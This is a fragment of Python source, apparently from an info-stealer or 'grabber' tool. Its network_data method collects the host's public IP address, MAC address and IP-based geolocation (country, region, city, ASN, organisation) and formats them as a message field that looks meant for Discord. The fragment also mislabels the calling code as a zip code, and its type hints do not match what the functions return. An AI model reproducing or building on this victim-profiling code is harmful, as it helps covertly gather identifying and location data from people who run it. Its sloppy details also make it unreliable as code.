...
class SystemInfo():
    ...
    def network_data(self) -> tuple[str, str, bool]:
        def geolocation(ip: str) -> str:
            ...
            return (data["country"], data["region"], data["city"], data["country_calling_code"], data["asn"], data["org"])

        ip = requests.get(
            "https://www.cloudflare.com/cdn-cgi/trace").text.split("ip=")[1].split("\n")[0]
        mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        country, region, city, zip_, as_, org = geolocation(ip)

        return (
            ":ringed_planet: Network",
            "```IP Address: {ip}\nMAC Address: {mac}\nCountry: {country}\nRegion: {region}\nCity: {city} ({zip_})\nASN: {as_}\nOrg: {org}```".format(
                ip=ip, mac=mac, country=country, region=region, city=city, zip_=zip_, as_=as_, org=org),
            False
        )
